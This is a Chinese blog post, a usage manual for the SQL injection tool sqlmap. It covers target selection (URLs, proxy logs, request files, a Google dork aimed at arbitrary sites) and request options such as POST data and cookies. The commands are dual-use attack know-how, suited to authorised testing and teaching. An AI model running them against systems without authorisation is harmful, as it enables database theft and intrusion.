

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Tr0y">
  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
  
    <meta name="description" content="SQLmap 使用手册以及一些我使用 SQLmap 的经验。">
<meta property="og:type" content="article">
<meta property="og:title" content="SQLmap 使用手册">
<meta property="og:url" content="https://www.tr0y.wang/2018/03/21/sqlmap-guide/">
<meta property="og:site_name" content="Tr0y&#39;s Blog">
<meta property="og:description" content="SQLmap 使用手册以及一些我使用 SQLmap 的经验。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/sqlmap.png/cover">
<meta property="article:published_time" content="2018-03-21T18:22:57.000Z">
<meta property="article:modified_time" content="2023-12-13T09:29:19.000Z">
<meta property="article:author" content="Tr0y">
<meta property="article:tag" content="工具">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="注入">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/sqlmap.png/cover">
  
  
  
  <title>SQLmap 使用手册 - Tr0y&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/my.css">
<link rel="stylesheet" href="/css/my-piczoom.css">
<link rel="stylesheet" href="/css/my-code.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  
    <!-- Baidu Analytics -->
    <script async>
      if (!Fluid.ctx.dnt) {
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
      }
    </script>
  

  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Tr0y&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-books"></i>
                生命线
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-archive-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/gallery/">
                <i class="iconfont icon-images"></i>
                摄影集
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="SQLmap 使用手册"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2018-03-21 18:22" pubdate>
          2018年3月21日 18:22:57
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          58k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          361 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar category-bar" style="margin-right: -1rem">
    





<div class="category-list">
  
  
    
    
    
    <div class="category row nomargin-x">
      <a class="category-item 
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
        aria-expanded="true"
      >
        经验总结
        <span class="list-group-count">(85)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
        
        
          
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2021/12/31/2021/" title="2021 年度总结"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021 年度总结</span>
        </a>
      
    
      
      
        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2021，来立些 flag 吧</span>
        </a>
      
    
      
      
        <a href="/2023/01/31/2022/" title="2022 年度总结"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2022 年度总结</span>
        </a>
      
    
      
      
        <a href="/2024/03/15/2023/" title="2023 年度总结"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 年度总结</span>
        </a>
      
    
      
      
        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 云南之旅</span>
        </a>
      
    
      
      
        <a href="/2025/03/14/2024/" title="2024 年度总结"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 年度总结</span>
        </a>
      
    
      
      
        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2024 🇫🇯 斐济之旅</span>
        </a>
      
    
      
      
        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CSRF 指北</span>
        </a>
      
    
      
      
        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">CTF 杂项之隐写术</span>
        </a>
      
    
      
      
        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">DNS 安全（一）：基础知识复习</span>
        </a>
      
    
      
      
        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
          <span class="category-post">More...</span>
        </a>
        
  </div>

          
  
    
    
    
    <div class="category-sub row nomargin-x">
      <a class="category-subitem collapsed
          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
        aria-expanded="false"
      >
        过程记录
        <span class="list-group-count">(1)</span>
        <i class="iconfont icon-arrowright"></i>
      </a>
      
      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
        
        
          
  <div class="category-post-list">
    
    
      
      
        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
           class="list-group-item list-group-item-action
           ">
          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
        </a>
      
    
  </div>

        
      </div>
    </div>
  
        
      </div>
    </div>
  
</div>


  </aside>


    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SQLmap 使用手册</h1>
            
              <p class="note note-info">
                
                  
                    本文最后更新于：2 年前
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>SQLmap 使用手册以及一些我使用 SQLmap 的经验。</p>
<span id="more"></span>
<h1 id="sqlmap-介绍">SQLmap 介绍</h1>
<h2 id="什么是-sqlmap">什么是 SQLmap</h2>
<p>Sqlmap 是由 Python 写成的，开源的自动化 SQL 注入工具</p>
<h2 id="特点">特点</h2>
<ol type="1">
<li>完全支持 MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB 和 Informix 等多种数据库管理系统。</li>
<li>完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。</li>
<li>在数据库证书、IP 地址、端口和数据库名等条件允许的情况下支持不通过 SQL 注入点而直接连接数据库。</li>
<li>支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。</li>
<li>支持自动识别密码哈希格式并通过字典破解密码哈希。</li>
<li>支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。</li>
<li>支持在数据库管理系统中搜索指定的数据库名、表名或列名</li>
<li>当数据库管理系统是 MySQL、PostgreSQL 或 Microsoft SQL Server 时支持下载或上传文件。</li>
<li>当数据库管理系统是 MySQL、PostgreSQL 或 Microsoft SQL Server 时支持执行任意命令并回现标准输出。</li>
</ol>
<h2 id="安装-sqlmap">安装 Sqlmap</h2>
<p><code>git clone https://github.com/sqlmapproject/sqlmap.git</code></p>
<h1 id="sqlmap-的各个阶段">SQLmap 的各个阶段</h1>
<h2 id="准备阶段">准备阶段</h2>
<h3 id="输出">输出</h3>
<h4 id="输出级别output-verbosity">输出级别(Output verbosity)</h4>
<blockquote>
<p>参数：-v</p>
</blockquote>
<p>Sqlmap 的输出信息按从简到繁共分为 7 个级别（和葫芦娃一样多），依次为 0、1、2、3、4、5 和 6。使用参数 <code>-v &lt;级别&gt;</code> 来指定某个等级，如使用参数 <code>-v 6</code> 来指定输出级别为 6。默认输出级别为 1。各个输出级别的描述如下：</p>
<blockquote>
<p>0：只显示 Python 的 tracebacks 信息、错误信息[ERROR]和关键信息[CRITICAL]；<br />
1：同时显示普通信息[INFO]和警告信息[WARNING]；<br />
2：同时显示调试信息[DEBUG]；<br />
3：同时显示注入使用的攻击荷载；<br />
4：同时显示 HTTP 请求；<br />
5：同时显示 HTTP 响应头；<br />
6：同时显示 HTTP 响应体。</p>
</blockquote>
<h3 id="指定目标">指定目标</h3>
<p>Sqlmap 运行时必须指定至少一个目标，支持一次指定多个目标。有以下几种指定目标的方式：</p>
<h4 id="直接连接数据库">直接连接数据库</h4>
<blockquote>
<p>参数：-d</p>
</blockquote>
<p>使用参数 <code>-d</code> 直接连接数据库，该参数后跟一个表示数据库的字符串，该字符串有以下两种格式：</p>
<ol type="1">
<li>当数据库管理系统是 MySQL、Oracle、Microsoft SQL Server 或 PostgreSQL 等时格式为：</li>
</ol>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">DBMS</span><span class="hljs-symbol">://USER</span><span class="hljs-symbol">:PASSWORD</span><span class="hljs-variable">@DBMS_IP</span><span class="hljs-symbol">:DBMS_PORT/DATABASE_NAME</span><br></code></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>当数据库管理系统是 SQLite、Microsoft Access 或 Firebird 等时格式为：</li>
</ol>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">DBMS</span><span class="hljs-symbol">://DATABASE_FILEPATH</span><br></code></pre></td></tr></table></figure>
<p>注意：Sqlmap 连接 Mysql 使用的是 python-pymysql 库，需要安装</p>
<p>连上之后除了检测数据库后除了获取 Mysql 的版本号之外便什么都没有做。让 Sqlmap 做点什么需要用其他参数指定，这些参数后面会说。</p>
<h4 id="指定目标-url">指定目标 URL</h4>
<blockquote>
<p>参数：<code>-u</code> 或 <code>--url</code></p>
</blockquote>
<p>使用参数 <code>-u</code> 或 <code>--url</code> 指定一个 URL 作为目标，该参数后跟一个表示 URL 的字符串，可以是 http 协议也可以是 https 协议，还可以指定端口，如：</p>
<p><code>python sqlmap.py -u "http://192.168.56.102:8080/user.php?id=0"</code></p>
<h4 id="从-burp-或-webscarab-的代理日志中解析目标">从 Burp 或 WebScarab 的代理日志中解析目标</h4>
<blockquote>
<p>参数：-l</p>
</blockquote>
<p>使用参数 <code>-l</code> 指定一个 Burp 或 WebScarab 的代理日志文件，Sqlmap 将从日志文件中解析出可能的攻击目标，并逐个尝试进行注入。该参数后跟一个表示日志文件的路径。</p>
<p>WebScarab 我没有用过，Burp 倒是常常会用。Burp 默认不记录日志，想要记录日志需要手动开启，设置方法如下图所示：</p>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/sqlmap-guide/1540348950.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="设置方法" /><figcaption aria-hidden="true">设置方法</figcaption>
</figure>
<p>该日志文件不仅记录了 GET 参数，还记录了 cookie 和 POST 参数。现在使用如下命令让 Sqlmap 解析该日志文件，自动寻找目标，检测注入漏洞：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">l</span> ../proxy.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>
<p>注意日志文件的路径要写正确。执行该命令时，每找到一个可能的攻击目标，Sqlmap 都会询问是否要检测该目标。，默认回答为<code>Y</code>，想要测试该目标，直接按回车键就行。</p>
<p>当日志较大时会有很多可能目标，虽然有询问机制但依旧麻烦，因为不能一路按回车而要进行判断。若是可以对日志进行过滤就好了！确实是可以的，参数为 <code>--scope</code> （后面会说</p>
<h4 id="从站点地图文件中解析目标">从站点地图文件中解析目标</h4>
<blockquote>
<p>参数：-x</p>
</blockquote>
<p>为便于搜索引擎收录，许多网站专门为搜索引擎生成了 xml 格式的站点地图，如<a target="_blank" rel="noopener" href="http://zhanzhang.baidu.com/college/courseinfo?id=267&amp;page=2#h2_article_title16">百度 Sitemap 支持 xml 格式</a>。Sqlmap 可以直接解析 xml 格式的站点地图，从中提取攻击目标，对一个网站全方位无死角地进行注入检测，此时使用的参数是<code>-x</code>，如：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">x</span> http://www.<span class="hljs-number">6</span>eat.<span class="hljs-keyword">com</span>/sitemap.xml<br></code></pre></td></tr></table></figure>
<p>但执行该命令的结果却是：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-built_in">WARNING</span>] <span class="hljs-keyword">no</span> usable links <span class="hljs-built_in">found</span> (<span class="hljs-keyword">with</span> <span class="hljs-keyword">GET</span> parameters)<br></code></pre></td></tr></table></figure>
<p>没有找到有 GET 参数的可用链接。就我有限的经验而言，站点地图中的 URL 很少包含 GET 参数，POST 参数就更不用说了。所以 Sqlmap 的这一功能似乎有些鸡肋。</p>
<h4 id="从文本文件中解析目标">从文本文件中解析目标</h4>
<blockquote>
<p>参数：-m</p>
</blockquote>
<p>参数 <code>-u</code> 一次只能指定一个 URL，若有多个 URL 需要测试就显得很不方便，我们可用将多个 URL 以一行一个的格式保存在文本文件中，然后使用参数 <code>-m</code>，后跟该文本文件路径，让 Sqlmap 依次读取文件中的 URL 作为攻击目标。</p>
<p>如我们有文件 url.txt，内容为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www.target1.com/vuln1.php?q=foobar<br>www.target2.com/vuln2.asp?<span class="hljs-built_in">id</span>=1<br>www.target3.com/vuln3/id/1*123<br></code></pre></td></tr></table></figure>
<p>然后可用使用如下命令让 Sqlmap 测试这些 URL 是否存在注入漏洞：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">m</span> url.txt<br></code></pre></td></tr></table></figure>
<p>同样,执行该命令时，Sqlmap 会很贴心地一个个询问：<code>do you want to test this URL?</code></p>
<h4 id="从文件载入-http-请求">从文件载入 HTTP 请求</h4>
<blockquote>
<p>参数：-r</p>
</blockquote>
<p>可以将一个 HTTP 请求保存在文件中，然后使用参数 <code>-r</code> 加载该文件，Sqlmap 会解析该文件，从该文件分析目标并进行测试。</p>
<p>设有如下所示的 HTTP 请求保存在文件 get.txt 中：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /user.php?id=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.56.101:8080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Ubuntu; Linux x86_64; rv:<span class="hljs-number">55</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">55</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-SG,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1123456789</span><br></code></pre></td></tr></table></figure>
<p>则使用如下命令让 Sqlmap 解析该文件，以该文件中 HTTP 请求目标为攻击目标进行测试：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -r <span class="hljs-built_in">get</span>.txt<br></code></pre></td></tr></table></figure>
<h4 id="将-google-搜索结果作为攻击目标">将 Google 搜索结果作为攻击目标</h4>
<blockquote>
<p>参数：-g</p>
</blockquote>
<p>Sqlmap 能自动获取 Google 搜索的前一百个结果，对其中有 GET 参数的 URL 进行注入测试。当然，所处的网络环境要能访问 Google 才行。下面是 Sqlmap 手册中<code>-g</code>参数的例子：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">python sqlmap.py -g <span class="hljs-string">&quot;inurl:<span class="hljs-subst">\&quot;</span>.php?id=1<span class="hljs-subst">\&quot;</span>&quot;</span><br></code></pre></td></tr></table></figure>
<h4 id="从配置文件中载入攻击目标">从配置文件中载入攻击目标</h4>
<blockquote>
<p>参数：-c</p>
</blockquote>
<p>使用参数 <code>-c</code> 指定一个配置文件（如：sqlmap.conf），Sqlmap 会解析该配置文件，按照该配置文件的配置执行动作。配置文件中可以指定攻击目标，实际上除了攻击目标外，配置文件还可以指定各种参数的值。</p>
<p>Sqlmap 的安装目录中有一个名为 sqlmap.conf 的文件，该文件是配置文件的模板，看看该文件内容，就能明白配置文件是什么意思了。</p>
<h2 id="发起请求阶段">发起请求阶段</h2>
<h3 id="请求">请求</h3>
<p>HTTP 是一个复杂的协议。HTTP 请求有很多种方法（method），可以在不同位置（GET、POST、cookie 和 User-Agent 等）携带不同参数。往往只有在特定位置携带了特定参数以特定方法发起的请求才是合法有效的请求。Sqlmap 运行时除了需要指定目标，有时还需要指定 HTTP 请求的一些细节。下面这些参数都用于指定 HTTP 请求细节。</p>
<p>相关参数说明：</p>
<h4 id="http-方法">HTTP 方法</h4>
<blockquote>
<p>参数：<code>--method</code></p>
</blockquote>
<p>一般来说，Sqlmap 能自动判断出是使用 GET 方法还是 POST 方法，但在某些情况下需要的可能是 PUT 等很少见的方法，此时就需要用参数 <code>--method</code> 来指定方法。如：<code>--method=PUT</code></p>
<h4 id="post-数据">POST 数据</h4>
<blockquote>
<p>参数：<code>--data</code></p>
</blockquote>
<p>该参数指定的数据会被作为 POST 数据提交，Sqlmap 也会检测该参数指定数据是否存在注入漏洞。如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.56.102:8080/user.php&quot;</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">&quot;id=0&amp;name=werner&quot;</span><br></code></pre></td></tr></table></figure>
<h4 id="指定分隔符">指定分隔符</h4>
<blockquote>
<p>参数：<code>--param-del</code></p>
</blockquote>
<p>上一个例子中 <code>--data</code> 的数据 <code>id=0&amp;name=werner</code> 其实由两个部分组成：<code>id=0</code> 和 <code>name=werner</code>，默认地以 <code>&amp;</code> 作为分隔符。我们可以使用 <code>--param-del</code> 来指定分隔符，如：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.56.102:8080/user.php&quot;</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">&quot;id=0;name=werner&quot;</span> <span class="hljs-attr">--param-del</span>=<span class="hljs-string">&quot;;&quot;</span><br></code></pre></td></tr></table></figure>
<h4 id="cookie">cookie</h4>
<blockquote>
<p>参数：<code>--cookie</code>、<code>--cookie-del</code>、<code>--drop-set-cookie</code> 和 <code>--load-cookies</code></p>
</blockquote>
<p>有两种情况会用到这些参数：</p>
<ol type="1">
<li>要测试的页面只有在登录状态下才能访问，登录状态用 cookie 识别</li>
<li>想要检测是否存在 cookie 注入</li>
</ol>
<p>当 <code>--level</code> 设置为 2 或更高时，Sqlmap 会检测 cookie 是否存在注入漏洞，关于 <code>--level</code> 的更多信息见下文。</p>
<ol type="1">
<li><p><code>--cookie</code> 和 <code>--cookie-del</code><br />
在浏览器中登录目标网站后复制出维持登录状态的 cookie，用参数<code>--cookie</code>来指定这些 cookie，如：<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.56.102:8080/user.php&quot;</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;JSESSIONID=E5D6C8C81;NAME=werner;&quot;</span><br></code></pre></td></tr></table></figure><br />
与 POST 参数不同，cookie 默认的分隔符为 <code>;</code>，想要指定 cookie 中的分隔符，使用参数 <code>--cookie-del</code>。</p></li>
<li><p><code>--drop-set-cookie</code><br />
若 HTTP 响应头中有<code>Set-Cookie</code>，Sqlmap 会自动设置<code>Set-Cookie</code>设置的 cookie，并对这些 cookie 进行检测。<br />
若不想让 Sqlmap 这么做，添加参数<code>--drop-set-cookie</code>即可，这样，Sqlmap 会忽略<code>Set-Cookie</code>。</p></li>
<li><p><code>--load-cookies</code><br />
该参数用于从文件中载入 Netscape 或 wget 格式的 cookie。<br />
wget 可以保存和载入 cookie，示例如下：<br />
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># Log in to the server.  This can be done only once.</span><br>wget <span class="hljs-params">--save-cookies</span> cookies.txt \<br>    <span class="hljs-params">--post-data</span> &#x27;user=foo&amp;password=bar&#x27; \<br>    http:<span class="hljs-string">//server.com/auth.php</span><br>    <br><span class="hljs-comment"># Now grab the page or pages we care about.</span><br>wget <span class="hljs-params">--load-cookies</span> cookies.txt \<br>    -p http:<span class="hljs-string">//server.com/interesting/article.php</span><br></code></pre></td></tr></table></figure></p></li>
</ol>
<h4 id="user-agent">User-Agent</h4>
<blockquote>
<p>参数：<code>--user-agent</code> 和<code>--random-agent</code></p>
</blockquote>
